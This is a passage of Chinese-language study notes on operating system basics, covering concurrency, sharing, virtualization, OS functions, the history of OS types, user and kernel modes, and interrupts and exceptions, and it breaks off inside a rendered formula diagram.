<p><strong>以现实生活中的例子来认识并发和并行的区别</strong>。例如：如果您在 <code>9:00~9:10</code> 仅吃面包，在 <code>9:10~9:20</code> 仅写字，在 <code>9:20~9:30</code> 仅吃面包，在 <code>9:30~10:00</code> 仅写字，那么在 <code>9:00~10:00</code> 吃面包和写字这两种行为就是并发执行的；如果您在 <code>9:00~10:00</code> 右手写字，左手同时拿着面包吃，那么这两个动作就是并行执行的。</p>
</li>
<li>
<p><strong>共享（Sharing）</strong></p>
<p>资源共享即共享，是指 <strong>系统中的资源可供内存中多个并发执行的进程共同使用</strong>。共享可分为以下 <strong>两种资源共享方式：</strong></p>
<ul>
<li>
<p><strong>互斥共享方式</strong></p>
<p>系统中的某些资源，如：打印机、磁带机，虽然可供多个进程使用，但为使得所打印或记录的结果不致造成混淆，应规定在一段时间内只允许一个进程访问该资源。</p>
<p>为此，当进程 <code>A</code> 访问某个资源时，必须先提出请求，若此时该资源空闲，则系统便将之分配给进程 <code>A</code> 使用，此后有其他进程也要访问该资源时（只要进程 <code>A</code> 未用完）就必须等待。仅当进程 <code>A</code> 访问完并释放该资源后，才允许另一个进程对该资源进行访问。这种资源共享方式称为 <strong>互斥式共享</strong>，而把在一段时间内只允许一个进程访问的资源称为 <strong>临界资源</strong>。计算机系统中的大多数物理设备及某些软件中所用的栈、变量和表格，都属于临界资源，它们都要求被互斥地共享。</p>
</li>
<li>
<p><strong>同时访问方式</strong></p>
<p>系统中还有另一类资源，这类资源允许在一段时间内由多个进程 “同时” 访问。这里所说的 “同时” 通常是宏观上的，而在微观上，这些进程可能是交替地对该资源进行访问即 “分时共享” 的。可供多个进程 “同时” 访问的典型资源是磁盘设备，一些用重入码编写的文件也可被 “同时” 共享，即允许若干个用户同时访问该文件。</p>
<p><strong>注意</strong> 互斥共享要求一种资源在一段时间内（哪怕是一段很小的时间）只能满足一个请求，否则就会出现严重的问题（想象一下打印机第一行打印 <code>A</code> 文档的内容、第二行打印 <code>B</code> 文档的内容的效果）。而同时访问共享通常要求一个请求分几个时间片段间隔地完成，其效果与连续完成的效果相同。</p>
</li>
</ul>
<p>并发和共享是操作系统两个最基本的特征，<strong>两者之间互为存在的条件</strong>：</p>
<ul>
<li>资源共享是以程序的并发为条件的，若系统不允许程序并发执行，则自然不存在资源共享问题</li>
<li>若系统不能对资源共享实施有效的管理，则必将影响到程序的并发执行，甚至根本无法并发执行</li>
</ul>
</li>
<li>
<p><strong>虚拟（Virtual）</strong></p>
<p>虚拟是指 <strong>把一个物理上的实体变为若干逻辑上的对应物</strong>。物理实体是实际存在的；而虚拟是用户感觉上的事物。用于实现虚拟的技术，称为 <strong>虚拟技术</strong>。操作系统中利用了多种虚拟技术来实现虚拟处理器、虚拟内存和虚拟外部设备等。</p>
<p>虚拟处理器技术是通过多道程序设计技术，采用让多道程序并发执行的方法，来分时使用一个处理器的。此时，虽然只有一个处理器，但它能同时为多个用户服务，使每个终端用户都感觉有一个中央处理器（CPU）在专门为它服务。利用多道程序设计技术把一个物理上的 CPU 虚拟为多个逻辑上的 CPU，称为 <strong>虚拟处理器。</strong></p>
<p>采用虚拟存储器技术将一台机器的物理存储器变为虚拟存储器，以便从逻辑上扩充存储器的容量。当然，这时用户所感觉到的内存容量是虚的。把用户感觉到（但实际不存在）的存储器称为 <strong>虚拟存储器。</strong></p>
<p>还可采用虚拟设备技术将一台物理 <code>I/O</code> 设备虚拟为多台逻辑上的 <code>I/O</code> 设备，并允许每个用户占用一台逻辑上的 <code>I/O</code> 设备，使原来仅允许在一段时间内由一个用户访问的设备（即临界资源）变为在一段时间内允许多个用户同时访问的共享设备。</p>
<p>因此，操作系统的虚拟技术可归纳为：<strong>时分复用技术</strong>，如：处理器的分时共享；<strong>空分复用技术</strong>，如：虚拟存储器。</p>
</li>
<li>
<p><strong>异步（Asynchronism）</strong></p>
<p>多道程序环境允许多个程序并发执行，但由于资源有限，进程的执行并不是一贯到底的，而是走走停停的，它以不可预知的速度向前推进，这就是 <strong>进程的异步性。</strong></p>
<p>异步性使得操作系统运行在一种随机的环境下，可能导致进程产生与时间有关的错误（就像对全局变量的访问顺序不当会导致程序出错一样）。然而，只要运行环境相同，操作系统就须保证多次运行进程后都能获得相同的结果。</p>
</li>
</ol>
<h4> 操作系统的目标和功能</h4>
<p>为了给多道程序提供良好的运行环境，操作系统应具有以下几方面的功能：<strong>处理机管理</strong>、<strong>存储器管理</strong>、<strong>设备管理</strong> 和 <strong>文件管理</strong>。为了方便用户使用操作系统，还必须向用户提供 <strong>接口</strong>。同时，操作系统可用来 <strong>扩充机器</strong>，以提供更方便的服务、更高的资源利用率。</p>
<p>用一个直观的例子来理解这种情况。例如：用户是雇主，操作系统是工人（用来操作机器），计算机是机器（由处理机、存储器、设备、文件几个部件构成），工人有熟练的技能，能够控制和协调各个部件的工作，这就是操作系统对计算机资源的管理；同时，工人必须接收雇主的命令，这就是 “接口”；有了工人，机器就能发挥更大的作用，因此工人就成了 “扩充机器”。</p>
<ol>
<li>
<p><strong>作为计算机系统资源的管理者</strong></p>
<ul>
<li>
<p><strong>处理机管理</strong></p>
<p>在多道程序环境下，处理机的分配和运行都以进程（或线程）为基本单位，因而 <strong>对处理机的管理可归结为对进程的管理</strong>。并发是指在计算机内同时运行多个进程，因此进程何时创建、何时撤销、如何管理、如何避免冲突、合理共享就是进程管理的最主要的任务。<strong>主要功能包括</strong>：进程控制、进程同步、进程通信、死锁处理、处理机调度等。</p>
</li>
<li>
<p><strong>存储器管理</strong></p>
<p>存储器管理是为了给多道程序的运行提供良好的环境，<strong>方便用户使用及提高内存的利用率</strong>。<strong>主要功能包括</strong>：内存分配与回收、地址映射、内存保护与共享和内存扩充等功能。</p>
</li>
<li>
<p><strong>文件管理</strong></p>
<p>计算机中的信息都是以文件的形式存在的，操作系统中负责文件管理的部分称为文件系统。<strong>主要功能包括</strong>：文件存储空间的管理、目录管理及文件读写管理和保护等。</p>
</li>
<li>
<p><strong>设备管理</strong></p>
<p>设备管理的主要任务是完成用户的 <code>I/O</code> 请求，方便用户使用各种设备，并提高设备的利用率。<strong>主要功能包括</strong>：缓冲管理、设备分配、设备处理和虚拟设备等功能。</p>
</li>
</ul>
<p>这些工作都由 “工人” 负责，“雇主” 无须关注。</p>
</li>
<li>
<p><strong>作为用户与计算机硬件系统之间的接口</strong></p>
<p>为了让用户方便、快捷、可靠地操纵计算机硬件并运行自己的程序，操作系统还提供了用户接口。操作系统提供的接口主要分为两类：一类是 <strong>命令接口</strong>，用户利用这些操作命令来组织和控制作业的执行；另一类是 <strong>程序接口</strong>，编程人员可以使用它们来请求操作系统服务。</p>
<ul>
<li>
<p><strong>命令接口</strong></p>
<p>使用命令接口进行作业控制的主要方式有两种，即 <strong>联机控制方式</strong> 和 <strong>脱机控制方式</strong>。按作业控制方式的不同，可将命令接口分为联机命令接口和脱机命令接口。</p>
<p><strong>联机命令接口</strong>：又称交互式命令接口，适用于分时或实时系统的接口。它由一组键盘操作命令组成。用户通过控制台或终端输入操作命令，向系统提出各种服务要求。用户每输入一条命令，控制权就转给操作系统的命令解释程序，然后由命令解释程序解释并执行输入的命令，完成指定的功能。之后，控制权转回控制台或终端，此时用户又可输入下一条命令。联机命令接口可以这样理解：“雇主” 说一句话，“工人” 做一件事，并做出反馈，这就强调了交互性。</p>
<p><strong>脱机命令接口</strong>：又称批处理命令接口，适用于批处理系统，它由一组作业控制命令组成。脱机用户不能直接干预作业的运行，而应事先用相应的作业控制命令写成一份作业操作说明书，连同作业一起提交给系统。系统调度到该作业时，由系统中的命令解释程序逐条解释执行作业说明书上的命令，从而间接地控制作业的运行。脱机命令接口可以这样理解：“雇主” 把要 “工人” 做的事写在清单上，“工人” 按照清单命令逐条完成这些事，这就是批处理。</p>
</li>
<li>
<p><strong>程序接口</strong></p>
<p>程序接口由一组系统调用（也称广义指令）组成。用户通过在程序中使用这些系统调用来请求操作系统为其提供服务，如：使用各种外部设备、申请分配和回收内存及其他各种要求。</p>
<p>当前最为流行的是图形用户界面（GUI），即图形接口。GUI 最终是通过调用程序接口实现的，用户通过鼠标和键盘在图形界面上单击或使用快捷键，就能很方便地使用操作系统。严格来说，图形接口不是操作系统的一部分，但图形接口所调用的系统调用命令是操作系统的一部分。</p>
</li>
</ul>
</li>
<li>
<p><strong>对计算机资源的扩充</strong></p>
<p>没有任何软件支持的计算机称为 <strong>裸机</strong>，它仅构成计算机系统的物质基础，而实际呈现在用户面前的计算机系统是经过若干层软件改造的计算机。裸机在最里层，其外面是操作系统。操作系统所提供的资源管理功能和方便用户的各种服务功能，将裸机改造成功能更强、使用更方便的机器；因此，通常把覆盖了软件的机器称为 <strong>扩充机器或虚拟机。</strong></p>
<p>“工人” 操作机器，机器就有更大的作用，于是 “工人” 便成了 “扩充机器”。</p>
</li>
</ol>
<h3> 操作系统发展历程</h3>
<h4> 手工操作阶段（此阶段无操作系统）</h4>
<p>用户在计算机上的所有工作都要人工干预，如：程序的装入、运行、结果的输出等。随着计算机硬件的发展，人机矛盾（速度和资源利用）越来越大，必须寻求新的解决办法。</p>
<p>手工操作阶段的 <strong>缺点</strong>：</p>
<ul>
<li>用户独占全机，虽然不会出现因资源已被其他用户占用而等待的现象，但资源利用率低</li>
<li>CPU 等待手工操作，CPU 的利用不充分</li>
</ul>
<p>唯一的解决办法就是用高速的机器代替相对较慢的手工操作来对作业进行控制。</p>
<h4> 批处理阶段（操作系统开始出现）</h4>
<p>为了解决人机矛盾及 CPU 和 <code>I/O</code> 设备之间速度不匹配的矛盾，出现了 <strong>批处理系统</strong>。按发展历程又分为：单道批处理系统、多道批处理系统（多道程序设计技术出现以后）。</p>
<ol>
<li>
<p><strong>单道批处理系统</strong></p>
<p>系统对作业的处理是成批进行的，但内存中始终保持一道作业。单道批处理系统是在解决人机矛盾及 CPU 和 <code>I/O</code> 设备速率不匹配的矛盾中形成的。单道批处理系统的 <strong>主要特征如下：</strong></p>
<ul>
<li><strong>自动性</strong>：在顺利的情况下，磁带上的一批作业能自动地逐个运行，而无须人工干预</li>
<li><strong>顺序性</strong>：磁带上的各道作业顺序地进入内存，各道作业的完成顺序与它们进入内存的顺序在正常情况下应完全相同，即先调入内存的作业先完成</li>
<li><strong>单道性</strong>：内存中仅有一道程序运行，即监督程序每次从磁带上只调入一道程序进入内存运行，当该程序完成或发生异常情况时，才换入其后继程序进入内存运行</li>
</ul>
<p>此时面临的问题是：每次主机内存中仅存放一道作业，每当它在运行期间（注意这里是 “运行时” 而不是 “完成后”）发出输入/输出请求后，高速的 CPU 便处于等待低速的 <code>I/O</code> 完成的状态。为了进一步提高资源的利用率和系统的吞吐量，引入了多道程序技术。</p>
</li>
<li>
<p><strong>多道批处理系统</strong></p>
<p>多道程序设计技术允许多个程序同时进入内存并允许它们在 CPU 中交替地运行，这些程序共享系统中的各种硬/软件资源。当一道程序因 <code>I/O</code> 请求而暂停运行时，CPU 便立即转去运行另一道程序。它不采用某些机制来提高某一技术方面的瓶颈问题，而让系统的各个组成部分都尽量去 “忙”，因此切换任务所花费的时间很少，可实现系统各部件之间的并行工作，使其整体在单位时间内的效率翻倍。</p>
<p><strong>多道程序设计的特点：</strong></p>
<ul>
<li><strong>多道</strong>：计算机内存中同时存放多道相互独立的程序</li>
<li><strong>宏观上并行</strong>：同时进入系统的多道程序都处于运行过程中，即它们先后开始各自的运行，但都未运行完毕</li>
<li><strong>微观上串行</strong>：内存中的多道程序轮流占有 CPU，交替执行</li>
</ul>
<p><strong>多道程序设计技术解决的问题：</strong></p>
<ul>
<li>如何分配处理器</li>
<li>多道程序的内存分配问题</li>
<li><code>I/O</code> 设备如何分配</li>
<li>如何组织和存放大量的程序和数据，以方便用户使用并保证其安全性与一致性</li>
</ul>
<p>在批处理系统中采用多道程序设计技术就形成了多道批处理操作系统。该系统把用户提交的作业成批地送入计算机内存，然后由作业调度程序自动地选择作业运行。</p>
<p><strong>多道批处理系统优缺点：</strong></p>
<ul>
<li><strong>优点</strong>：资源利用率高，多道程序共享计算机资源，从而使各种资源得到充分利用；系统吞吐量大，CPU 和其它资源保持 “忙碌” 状态</li>
<li><strong>缺点</strong>：用户响应的时间较长；不提供人机交互能力，用户既不能了解自己的程序的运行情况，又不能控制计算机</li>
</ul>
</li>
</ol>
<h4> 分时操作系统</h4>
<p>分时技术是指 <strong>把处理器的运行时间分成很短的时间片，按时间片轮流把处理器分配给各联机作业使用</strong>。若某个作业在分配给它的时间片内不能完成其计算，则该作业暂时停止运行，把处理器让给其他作业使用，等待下一轮再继续运行。由于计算机速度很快，作业运行轮转得也很快，因此给每个用户的感觉就像是自己独占一台计算机。</p>
<p>分时操作系统是指 <strong>多个用户通过终端同时共享一台主机，这些终端连接在主机上，用户可以同时与主机进行交互操作而互不干扰</strong>。因此，实现分时系统最关键的问题是如何使用户能与自己的作业进行交互，即当用户在自已的终端上键入命令时，系统应能及时接收并及时处理该命令，再将结果返回用户。分时系统也是支持多道程序设计的系统，但它不同于多道批处理系统。多道批处理是实现作业自动控制而无须人工干预的系统，而分时系统是实现人机交互的系统，这使得分时系统具有与批处理系统不同的特征。</p>
<p><strong>分时系统的主要特征如下：</strong></p>
<ul>
<li><strong>同时性</strong>：也称多路性，允许多个终端用户同时使用一台计算机，终端上的这些用户可以同时或基本同时使用计算机</li>
<li><strong>交互性</strong>：用户通过终端采用人机对话的方式直接控制程序运行，与同程序进行交互</li>
<li><strong>独立性</strong>：系统中多个用户可以彼此独立地进行操作，互不干扰</li>
<li><strong>及时性</strong>：采用时间片轮转方式使一台计算机同时为多个终端服务，使用户请求能在很短时间内获得响应</li>
</ul>
<p>虽然分时操作系统较好地解决了人机交互问题，但在一些应用场合，需要系统能对外部的信息在规定的时间（比时间片的时间还短）内做出处理（比如：飞机订票系统或导弹制导系统），因此，实时操作系统应运而生。</p>
<h4> 实时操作系统</h4>
<p>能够在某个时间限制内完成某些紧急任务而不需要时间片排队。这里的 <strong>时间限制可以分为两种情况：</strong></p>
<ul>
<li><strong>硬实时系统</strong>：某个动作必须绝对地在规定的时刻（或规定的时间范围）发生，如：飞行器的飞行自动控制系统，这类系统必须提供绝对保证，让某个特定的动作在规定的时间内完成</li>
<li><strong>软实时系统</strong>：能够接受偶尔违反时间规定且不会引起任何永久性的损害，如:飞机订票系统、银行管理系统</li>
</ul>
<p>在实时操作系统的控制下，计算机系统接收到外部信号后及时进行处理，并在严格的时限内处理完接收的事件。<strong>实时操作系统的主要特点</strong> 是及时性和可靠性。</p>
<h4> 网络操作系统和分布式计算机系统</h4>
<p><strong>网络操作系统</strong> 把计算机网络中的各台计算机有机地结合起来，提供一种统一、经济而有效的使用各台计算机的方法，实现各台计算机之间数据的互相传送。<strong>网络操作系统最主要的特点</strong> 是网络中各种资源的共享及各台计算机之间的通信。</p>
<p><strong>分布式计算机系统</strong> 是由多台计算机组成并满足下列条件的系统：</p>
<ul>
<li>系统中任意两台计算机通过通信方式交换信息</li>
<li>系统中的每台计算机都具有同等的地位，即没有主机也没有从机</li>
<li>每台计算机上的资源为所有用户共享</li>
<li>系统中的任意台计算机都可以构成一个子系统，并且还能重构</li>
<li>任何工作都可以分布在几台计算机上，由它们并行工作、协同完成</li>
</ul>
<p>用于管理分布式计算机系统的操作系统称为 <strong>分布式计算机系统</strong>。<strong>分布式计算机系统主要特点</strong> 是分布性和并行性。分布式操作系统与网络操作系统的本质不同是分布式操作系统中的若干计算机相互协同完成同一任务。</p>
<h4> 个人计算机操作系统</h4>
<p>个人计算机操作系统是目前使用最广泛的操作系统，它广泛应用于文字处理、电子表格、游戏中，常见的有 <code>Windows</code>、<code>Linux</code> 和 <code>MacOS</code> 等。</p>
<p><strong>操作系统的发展历程</strong>：</p>
<ul>
<li><strong>手工阶段</strong>：独占计算机资源、资源利用率低</li>
<li><strong>脱机处理</strong>：减少了 CPU 的空闲时间，提高了 <code>I/O</code> 速度</li>
<li><strong>早期批处理</strong>：高效利用 CPU 的资源</li>
<li><strong>多道批处理</strong>：多道、宏观上并行、微观上串行</li>
<li><strong>分时操作系统</strong>：交互性强</li>
<li><strong>实时操作系统</strong>：及时性和可靠性强，交互性不如分时系统</li>
<li><strong>网络操作系统</strong>：服务于计算机网络，集中控制方式</li>
<li><strong>分布式操作系统</strong>：建立在网络操作系统上，控制功能均为分布式</li>
<li><strong>个人计算机操作系统</strong>：目前最广泛</li>
</ul>
<p>此外还有 <strong>嵌入式操作系统</strong>、<strong>服务器操作系统</strong>、<strong>智能手机操作系统</strong> 等</p>
<h3> 操作系统运行环境</h3>
<h4> 处理器运行模式</h4>
<p>在计算机系统中，通常 CPU 执行 <strong>两种不同性质的程序</strong>：一种是操作系统内核程序；另一种是用户自编程序（即系统外层的应用程序，或简称 “应用程序”）。对操作系统而言，这两种程序的作用不同，前者是后者的管理者，因此 “管理程序”（即内核程序）要执行一些特权指令，而 “被管理程序”（即用户自编程序）出于安全考虑不能执行这些指令。</p>
<ul>
<li><strong>特权指令</strong>：是指不允许用户直接使用的指令，如：<code>I/O</code> 指令、置中断指令，存取用于内存保护的寄存器、送程序状态字到程序状态字寄存器等的指令</li>
<li><strong>非特权指令</strong>：是指允许用户直接使用的指令，它不能直接访问系统中的软硬件资源，仅限于访问用户的地址空间，这也是为了防止用户程序对系统造成破坏</li>
</ul>
<p>在具体实现上，将 CPU 的运行模式划分为 <strong>用户态（目态）</strong> 和 <strong>核心态（又称管态、内核态）</strong>。可以理解为 CPU 内部有一个小开关，当小开关为 <code>0</code> 时，CPU 处于核心态，此时 CPU 可以执行特权指令，切换到用户态的指令也是特权指令。当小开关为 <code>1</code> 时，CPU 处于用户态，此时 CPU 只能执行非特权指令。应用程序运行在用户态，操作系统内核程序运行在核心态。应用程序向操作系统请求服务时通过使用访管指令，从而产生一个中断事件将操作系统转换为核心态。</p>
<p>在软件工程思想和结构化程序设计方法影响下诞生的现代操作系统，几乎都是分层式的结构。操作系统的各项功能分别被设置在不同的层次上。一些与硬件关联较紧密的模块，如：时钟管理、中断处理、设备驱动等处于最低层。其次是运行频率较高的程序，如：进程管理、存储器管理和设备管理等。这两部分内容构成了操作系统的内核。这部分内容的指令操作工作在核心态。</p>
<p>内核是计算机上配置的底层软件，它管理着系统的各种资源，可以看作是连接应用程序和硬件的一座桥梁，大多数操作系统的 <strong>内核包括四方面的内容：</strong></p>
<ol>
<li>
<p><strong>时钟管理</strong></p>
<p>在计算机的各种部件中，时钟是最关键的设备。时钟的第一功能是计时，操作系统需要通过时钟管理，向用户提供标准的系统时间。另外，通过时钟中断的管理，可以实现进程的切换。例如：在分时操作系统中采用时间片轮转调度、在实时系统中按截止时间控制运行、在批处理系统中通过时钟管理来衡量一个作业的运行程度等。</p>
</li>
<li>
<p><strong>中断机制</strong></p>
<p>引入中断技术的初衷是提高多道程序运行环境中 CPU 的利用率，而且主要是针对外部设备的。后来逐步得到发展，形成了多种类型，成为操作系统各项操作的基础。例如：键盘或鼠标信息的输入、进程的管理和调度、系统功能的调用、设备驱动、文件访问等，无不依赖于中断机制。可以说，现代操作系统是靠中断驱动的软件。</p>
<p>中断机制中，只有一小部分功能属于内核，它们负责保护和恢复中断现场的信息，转移控制权到相关的处理程序。这样可以减少中断的处理时间，提高系统的并行处理能力。</p>
</li>
<li>
<p><strong>原语</strong></p>
<p>按层次结构设计的操作系统，底层必然是一些可被调用的公用小程序，它们各自完成一个规定的操作。它们的特点如下：</p>
<ul>
<li>处于操作系统的最底层，是最接近硬件的部分</li>
<li>运行具有原子性，其操作只能一气呵成（出于系统安全性和便于管理考虑）</li>
<li>运行时间都较短，而且调用频繁</li>
</ul>
<p>通常把具有这些特点的程序称为 <strong>原语（Atomic Operation）</strong>。定义原语的直接方法是关闭中断，让其所有动作不可分割地完成后再打开中断。系统中的设备驱动、CPU 切换、进程通信等功能中的部分操作都可定义为原语，使它们成为内核的组成部分。</p>
</li>
<li>
<p><strong>系统控制的数据结构及处理</strong></p>
<p>系统中用来登记状态信息的数据结构很多，如：作业控制块、进程控制块（PCB）、设备控制块、各类链表、消息队列、缓冲区、空闲区登记表、内存分配表等。为了实现有效的管理，系统需要一些基本的操作，<strong>常见的操作有以下三种：</strong></p>
<ul>
<li><strong>进程管理</strong>：进程状态管理、进程调度和分派、创建与撤销进程控制块等</li>
<li><strong>存储器管理</strong>：存储器的空间分配和回收、内存信息保护程序、代码对换程序等</li>
<li><strong>设备管理</strong>：缓冲区管理、设备分配和回收等</li>
</ul>
</li>
</ol>
<p>从上述内容可以了解，核心态指令实际上包括系统调用类指令和一些针对时钟、中断和原语的操作指令。</p>
<h4> 中断和异常的概念</h4>
<p>在操作系统中引入核心态和用户态这两种工作状态后，就需要考虑这两种状态之间如何切换。<strong>操作系统内核工作在核心态，而用户程序工作在用户态</strong>。系统不允许用户程序实现核心态的功能，而它们又必须使用这些功能。因此，需要在核心态建立一些 “门”，以便实现从用户态进入核心态。</p>
<p>在实际操作系统中，CPU 运行上层程序时唯一能进入这些 “门” 的途径就是通过中断或异常。发生中断或异常时，运行用户态的 CPU 会立即进入核心态，这是通过硬件实现的（例如：用一个特殊寄存器的一位来表示 CPU 所处的工作状态，<code>0</code> 表示核心态，<code>1</code> 表示用户态。若要进入核心态，则只需将该位置 <code>0</code> 即可）。中断是操作系统中非常重要的一个概念，对一个运行在计算机上的实用操作系统而言，缺少了中断机制，将是不可想象的。原因是，操作系统的发展过程大体上就是一个想方设法不断提高资源利用率的过程，而提高资源利用率就需要在程序并未使用某种资源时，把它对那种资源的占有权释放，而这一行为就需要通过中断实现。</p>
<ol>
<li>
<p><strong>中断和异常的定义</strong></p>
<p><strong>中断（Interruption）</strong>：也称外中断，是指来自 CPU 执行指令外部的事件，通常用于信息输入/输出，如：设备发出的 <code>I/O</code> 结束中断，表示设备输入/输出处理已经完成。时钟中断，表示一个固定的时间片已到，让处理机处理计时、启动定时运行的任务等。</p>
<p><strong>异常（Exception）</strong>：也称内中断，是指来自 CPU 执行指令内部的事件，如：程序的非法操作码、地址越界、运算溢出、虚存系统的缺页及专门的陷入指令等引起的事件。异常不能被屏蔽，一旦出现，就应立即处理。关于内中断和外中断的联系与区别如下所示：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>中断</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>内部异常</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mrow><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>故障（Fault）</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>自陷（Trap）</mtext></mstyle></mtd></mtr></mtable><mo fence="true">}</mo></mrow><mtext>软件中断</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>终止（Abort）</mtext><mspace width="0.7113em"></mspace><mtext>&nbsp;硬件中断</mtext></mrow></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>外部中断（硬件）</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>可屏蔽中断&nbsp;INTR</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>不可屏蔽中断&nbsp;NMI</mtext></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">
\text{中断}
\begin{cases}
\text{内部异常}
  \begin{cases}
    \begin{rcases}
    \text{故障（Fault）} \\
    \text{自陷（Trap）}
    \end{rcases}
    \text{软件中断} \\
  \text{终止（Abort）\hspace{0.25cm} 硬件中断}
  \end{cases} \\
\text{外部中断（硬件）}
  \begin{cases}
  \text{可屏蔽中断 INTR} \\
  \text{不可屏蔽中断 NMI}
  \end{cases}
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.4401em;vertical-align:-3.47em;"></span><span class="mord text"><span class="mord cjk_fallback">中断</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-1.366em;"><span class="pstrut" style="height:3.816em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-1.358em;"><span class="pstrut" style="height:3.816em;"></span><span style="height:1.816em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="1.816em" style="width:0.8889em" viewBox="0 0 888.89 1816" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V1816 H384z M384 0 H504 V1816 H384z"></path></svg></span></span><span style="top:-3.816em;"><span class="pstrut" style="height:3.816em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.958em;"><span class="pstrut" style="height:3.816em;"></span><span style="height:1.816em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="1.816em" style="width:0.8889em" viewBox="0 0 888.89 1816" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V1816 H384z M384 0 H504 V1816 H384z"></path></svg></span></span><span style="top:-6.766em;"><span class="pstrut" style="height:3.816em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.97em;"><span style="top:-5.97em;"><span class="pstrut" style="height:4.47em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">内部异常</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35em;"><span style="top:-2.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.192em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"></path></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"></path></svg></span></span><span style="top:-4.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.85em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.47em;"><span style="top:-4.47em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="minner"><span class="mopen nulldelimiter"></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">故障（</span><span class="mord">Fault</span><span class="mord cjk_fallback">）</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">自陷（</span><span class="mord">Trap</span><span class="mord cjk_fallback">）</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">}</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord cjk_fallback">软件中断</span></span></span></span><span style="top:-2.212em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">终止（</span><span class="mord">Abort</span><span class="mord cjk_fallback">）</span><span class="mspace" style="margin-right:0.7113em;"></span><span class="mord">&nbsp;</span><span class="mord cjk_fallback">硬件中断</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.97em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:4.47em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">外部中断（硬件）</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">可屏蔽中断</span><span 